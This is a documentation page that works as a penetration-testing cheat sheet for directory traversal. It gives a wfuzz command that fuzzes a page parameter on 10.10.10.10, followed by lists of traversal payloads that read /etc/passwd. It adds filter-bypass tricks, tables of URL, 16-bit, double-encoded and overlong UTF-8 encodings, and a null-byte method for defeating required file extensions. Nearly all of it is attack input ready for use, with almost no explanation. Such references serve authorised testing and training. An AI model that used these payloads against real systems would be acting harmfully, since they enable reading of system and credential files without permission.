---
title: "Directory Traversal"
draft: false
images: []
menu:
  docs:
    parent: "Wapp"
weight: 100
toc: true
---
```
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### Examples:

* ../../../etc/passwd
* ....//....//....//etc/passwd
* .%252f..%252f..%252fetc/passwd
* /var/www/images/../../../etc/passwd
* ./../../etc/passwd%00.png
### Try non-standard encoding:
* . = %2e
* / = %2f
* \ = %5c
### 16-bit:
* . = %u002e
* / = %u2215
* \ = %u2216
### Double URL:
* . = %252e
* / = %252f
* \ = %255c
### UTF-8:
* . = %c0%2e, %e0%40%ae, %c0ae
* / = %c0%af, %e0%80%af, %c0%2f
* \ = %c0%5c, %c0%80%5c

If an application requires that the user-supplied filename must end with an expected file extension, such as .png, then it might be possible to use a null byte to effectively terminate the file path before the required extension.

For example: filename=../../../etc/passwd%00.png